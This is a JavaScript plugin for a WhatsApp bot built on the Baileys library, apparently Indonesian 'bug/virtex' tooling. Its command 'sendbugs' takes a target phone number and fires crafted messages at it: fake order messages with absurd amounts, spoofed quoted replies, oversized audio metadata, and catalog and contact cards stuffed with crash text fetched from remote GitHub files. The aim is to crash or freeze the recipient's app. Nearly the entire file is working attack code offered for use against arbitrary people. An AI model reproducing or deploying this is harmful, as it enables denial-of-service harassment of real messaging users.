import pkg from '@adiwajshing/baileys'
import fs from 'fs'
import fetch from 'node-fetch'
import { sticker } from '../lib/sticker.js'

const { generateWAMessageFromContent, prepareWAMessageMedia, proto } = pkg

let handler  = async (m, { conn, args, text, command, usedPrefix: _p, participants }) => {
	if (!text)return m.reply(`Contoh Penggunaan : *${_p + command}* <62XXXXXXXXXX>\n\n*Note :*\nGunakan Fitur Hanya Untuk Ripper Atau Scamer jangan pulak owner gw @${nomorown.split`@`[0]}`)
	let thumb = fs.readFileSync('./thumbnail.jpg')
	let virus = await (await fetch("https://raw.githubusercontent.com/Nevt12/basedb/main/v12.txt")).text()
	let virus2 = await (await fetch("https://raw.githubusercontent.com/Nevt12/basedb/main/v26.txt")).text()
	let type = (args[0] || '').toLowerCase()

	const from = m.key.remoteJid
	//const participants = m.isGroup ? await groupMetadata.participants : ''
	let packname = 'WannTrue'
	let q = `Bug Tag From HyzerDev\n${text}`
	let sections = [{
		title: `Recoded by ${packname}`,
		rows: [
			{ title: 'Bug PDF', rowId: `${_p + command} pdf ${text}` },
			{ title: 'Bug VN', rowId: `${_p + command} vn ${text}` },
			{ title: 'Bug Sticker', rowId: `${_p + command} sticker ${text}` },
			{ title: 'Bug Image', rowId: `${_p + command} bugimg ${text}` },
			{ title: 'Bug Video', rowId: `${_p + command} bugvid ${text}` },
			{ title: 'Bug Crash', rowId: `${_p + command} bugcrash ${text}` },
			{ title: 'Bug Kontak ERROR❗', rowId: `${_p + command} bugkontak ${text}` },
			{ title: 'Bug ReactPc', rowId: `${_p + command} reactpc ${text}` },		
			{ title: 'Bug Catalog', rowId: `${_p + command} bugcatalog ${text}` },
			{ title: 'Bug TextCrash', rowId: `${_p + command} bugtextcrash ${text}` },
		]
	}]
	let listMessage = {
		text: '*[ List Bug ]*\n\n*Note :* Gunakan +62 dan isi nomor yg bener Bre ',
		footer: packname,
		buttonText: 'Silahkan Klik Bre',
		sections
	}

	//==================( Quoted ) =================//
	//# Kal
	const kal = { key: { fromMe: false, participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "@s.whatsapp.net" } : {}) },
	"message": {
		"extendedTextMessage": {
			"text": `${packname}`,
			"previewType": "NONE",
			"contextInfo": {
				"stanzaId": "3EB0382EDBB2",
				"participant": "@s.whatsapp.net"
			}
		}
	}}
	//=================================================//		
	//# Troli
	const trol = { key: { fromMe: false, fromMe: false, participant: `0@s.whatsapp.net`, ...({ remoteJid: "" }) },
	"message": {
		"orderMessage": {
			"orderId": "594071395007984",
			"thumbnail": fs.readFileSync('./thumbnail.jpg'),
			"itemCount": 100000000000,
			"status": "INQUIRY",
			"surface": "CATALOG",
			"message": "",
			"orderTitle": `${packname}`,
			"sellerJid": "62857887347569@s.whatsapp.net",
			"token": "AR40+xXRlWKpdJ2ILEqtgoUFd45C8rc1CMYdYG/R2KXrSg==",
			"totalAmount1000": "500000000000000",
			"totalCurrencyCode": "IDR"
		}
	}}
	//#Troli 2
	const ftrolii = { key: { fromMe: false, "participant":"0@s.whatsapp.net", "remoteJid": "@g.us"},
	"message": {
		orderMessage: { 		itemCount: 100000000000,
			status: 200, 		thumbnail: thumb, 		surface: 200, 		message: `© ${packname}`,
			token: "AR40+xXRlWKpdJ2ILEqtgoUFd45C8rc1CMYdYG/R2KXrSg==",
			totalAmount1000: "500000000000000",
			totalCurrencyCode: "IDR",
			orderTitle: `${packname} ${virus2}`,
			sellerJid: '0@s.whatsapp.net'}}, 		contextInfo: { "forwardingScore":999,"isForwarded":true },
		sendEphemeral: true
	}	
	//=================================================//	
	//# Sticker
	const bugstik = { key: { fromMe: false, participant: `0@s.whatsapp.net`, ...({ remoteJid: "" }) }, "message": {
		"orderMessage": {
			"orderId": "594071395007984",
			"thumbnail": fs.readFileSync('./thumbnail.jpg'),
			"itemCount": 100000000000,
			"status": "INQUIRY",
			"surface": "CATALOG",
			"message": `${packname}`,
			"orderTitle": `${packname}`,
			"sellerJid": "62857887347569@s.whatsapp.net",
			"token": "AR40+xXRlWKpdJ2ILEqtgoUFd45C8rc1CMYdYG/R2KXrSg==",
			"totalAmount1000": "500000000000000",
			"totalCurrencyCode": "IDR"
		}
	}}
	//=================================================//
	//# Pdf
	const bugpdf = { key: { fromMe: false, participant: `0@s.whatsapp.net`, ...({ remoteJid: "" }) },
	message: {
		"imageMessage": { "mimetype": "image/jpeg", "caption": `${packname}`, "jpegThumbnail": thumb
		}
	}}
	//=================================================//   
	//# Vn
	const adehvn = { key: { fromMe: false, participant: `0@s.whatsapp.net`, ...({ remoteJid: "" }) },
	"message": {
		"locationMessage": {}
	}} 
	//=================================================//	   
	//# Image
	const bugimage = { key: { fromMe: false, participant: `0@s.whatsapp.net`, ...({ remoteJid: "" }) },
		"message": {
			"audioMessage": {
				"url": "https://mmg.whatsapp.net/d/f/AqXaKHS3AY_ONTjToJq-wEqO11SqPgaAzGLzg02IBAVP.enc",
				"mimetype": "audio/aac",
				"fileSha256": "3kPrHVqimG+Y7dLgq/q+KPFbZczIgg7SBbuU3UdrinQ=",
				"fileLength": "285473",
				"seconds": 9999999999,
				"caption": `${packname}`,
				"ptt": false,
				"mediaKey": "SPVvc1ACQyGfWw8CFuqtQ8RUrv8rsa1JK5AkqcMiPEI=",
				"fileEncSha256": "H8EQqzkVWPOvrjoAOGC9FgJkO5KMlScV8+G7ucyVwlo=",
				"directPath": "/v/t62.7114-24/35331424_231575432280264_9094348830349350878_n.enc?ccb=11-4&oh=bb04b71d85c088ec24446502b8c52d14&oe=61767ADB",
				"mediaKeyTimestamp": "1632753911"
			}
		}
	}
	//=================================================//		
	//# Catalog
	const messa = await prepareWAMessageMedia({ image: fs.readFileSync('./thumbnail.jpg') }, { upload: conn.waUploadToServer })
	const catalog = generateWAMessageFromContent(m.chat, proto.Message.fromObject({
		"productMessage": {
		"product": {
			"productImage": messa.imageMessage,
			"productId": "4383282311765462",
			"title": `${packname}`,
			"description": `${virus2}`,
			"currencyCode": "IDR",
			"bodyText": `${virus}`,
			"footerText": `${packname}`,
			"priceAmount1000": "10000000",
			"productImageCount": 1,
			"firstImageId": 1,
			"salePriceAmount1000": "10000000",
			"retailerId": `${packname}`,
			"url": "wa.me/62881037044211"
		},
			"businessOwnerJid": "62881037044211@s.whatsapp.net",
		}
	}), { userJid: m.chat, quoted: ftrolii })	
	//=================================================//	
	//# Contact
	const fkontaak = { key: { fromMe: false, participant: `0@s.whatsapp.net`, ...(m.chat ? { remoteJid: "@broadcast" } : {})}, message: { "contactMessage":{"displayName": `${packname}${virus}`,"vcard":`BEGIN:VCARD\nVERSION:3.0\nN:2;conn;;;\nFN:${packname}\nitem1.TEL;waid=6281991410940:6281991410940\nitem1.X-ABLabel:Mobile\nEND:VCARD` }}}  
	//=================================================//   
	//# Text
	const main = {
		"key": {
			"fromMe": false,
			"participant": "0@s.whatsapp.net",
			...({"remoteJid":''})
			},
		"message":{
			"imageMessage":{
				"mimetype":"image/jpeg",
				"jpegThumbnail":fs.readFileSync('./thumbnail.jpg')
			}
		}
	}
	//=================================================//   

	switch (type) {
		case 'vn': {
			conn.sendMessage(text.replace(/[^0-9]/g, '') + '@s.whatsapp.net', {audio: thumb, mimetype: 'audio/mpeg', ptt:true }, {quoted: adehvn})
			//await m.reply(`Berhasil Mengirim Bug Vn Di Nomer ${text}@s.whatsapp.net`)
		}
		break
		case 'pdf': {
			conn.sendMessage(text.replace(/[^0-9]/g, '') + '@s.whatsapp.net', {document: thumb, filename:`🌞𖧹͓͜͜͡𝑴͜͡𝑨͜͡҉𝑴͜͡𝑨͜͡҉𝑪͜͡𝑶͜͡𖧹͓͓󠇞𞥊.pdf`, mimetype: 'application/pdf',}, {quoted: bugpdf})
			//await m.reply(`Berhasil Mengirim Bug Pdf Di Nomer ${text}@s.whatsapp.net`)
		}
		break
		case 'sticker': {
			let stiker = await sticker(null, 'https://telegra.ph/file/e2d2fac4853f1f923b35c.jpg', global.packname, global.author)
			conn.sendFile(text.replace(/[^0-9]/g, '') + '@s.whatsapp.net', stiker, 'sticker.webp', '', false, { asSticker: true }, {quoted: bugstik})
			//await m.reply(`Berhasil Mengirim ${type} Di Nomer ${text}@s.whatsapp.net`)
		}
		break
		case 'bugimg': {
			conn.sendMessage(text.replace(/[^0-9]/g, '') + '@s.whatsapp.net', {image: thumb, bugimage }, {quoted: bugimage})
		}
		break
		case 'bugcrash': {
			conn.fakeReply(text.replace(/[^0-9]/g, '') + '@s.whatsapp.net', 'A', '622150996855@s.whatsapp.net', 'B', '0@s.whatsapp.net@broadcast')
			conn.fakeReply(text.replace(/[^0-9]/g, '') + '@s.whatsapp.net', 'A', '622150996855@s.whatsapp.net', 'B', '0@broadcast')
			conn.fakeReply(text.replace(/[^0-9]/g, '') + '@s.whatsapp.net', 'A', '15517868074@s.whatsapp.net', 'B', '0@broadcast')
			conn.fakeReply(text.replace(/[^0-9]/g, '') + '@s.whatsapp.net', 'A', '15517868074@s.whatsapp.net', 'B', '0@s.whatsapp.net@broadcast')
			conn.fakeReply(text.replace(/[^0-9]/g, '') + '@s.whatsapp.net', 'A', '447710173736@s.whatsapp.net', 'B', '0@broadcast')
			conn.fakeReply(text.replace(/[^0-9]/g, '') + '@s.whatsapp.net', 'A', '447710173736@s.whatsapp.net', 'B', '0@s.whatsapp.net@broadcast')
			//await m.reply(`Berhasil Mengirim ${type} Di Nomer ${text}@s.whatsapp.net`)
		}
		break
		/*case 'bugkontak': {
			let res = await generateWAMessageFromContent(text.replace(/[^0-9]/g, '') + '@s.whatsapp.net', {
				"contactMessage": {
					"vcard": "HAHaAhHAHAHA",
					"displayName": `HyzerDev`,
					"contextInfo": {
						"forwardingScore": 3,
						"isForwarded": true
					}
				}
			}, {quoted: fkontaak, contextInfo:{}}) 
			conn.relayWAMessage(res)
			//await m.reply(`Berhasil Mengirim ${type} Di Nomer ${text}@s.whatsapp.net`)
		}
		break*/
		case 'reactpc': {
			await conn.sendMessage(text.replace(/[^0-9]/g, '') + '@s.whatsapp.net', {text: `${packname}` }, {quoted: trol})
			//await m.reply(`Berhasil Mengirim Bug React Di Nomer ${text}@s.whatsapp.net`)
		}
		break
		case 'bugtag': {
			if (!m.isGroup) return global.dfail('group',m,conn)
			conn.sendMessage(m.chat, { text : q ? q : '' , mentions: participants.map(a => a.id)}, { quoted: kal })
		}
		break
		case 'bugcatalog': {
			conn.relayMessage(text.replace(/[^0-9]/g, '') + '@s.whatsapp.net', catalog.message, { messageId: catalog.key.id })
		}
		break
		case 'bugtextcrash': {
			conn.reply(text.replace(/[^0-9]/g, '') + '@s.whatsapp.net', `${packname}`, main)
		}
		break
		case 'bugvid': {
			conn.sendMessage(text.replace(/[^0-9]/g, '') + '@s.whatsapp.net', {video: thumb, bugimage, }, {quoted: bugimage})
		}
		break
		default:
			if (!/[01]/.test(command)) return conn.sendMessage(m.chat, listMessage, m)
			throw false
	}
	m.reply(`Berhasil Mengirim ${type} Di Nomer ${text}@s.whatsapp.net`)
}

handler.help = ['sendbugs <nomer>']
handler.tags = ['main']
handler.command = /^((send)?(bugs?|virtex|virus))$/i

export default handler
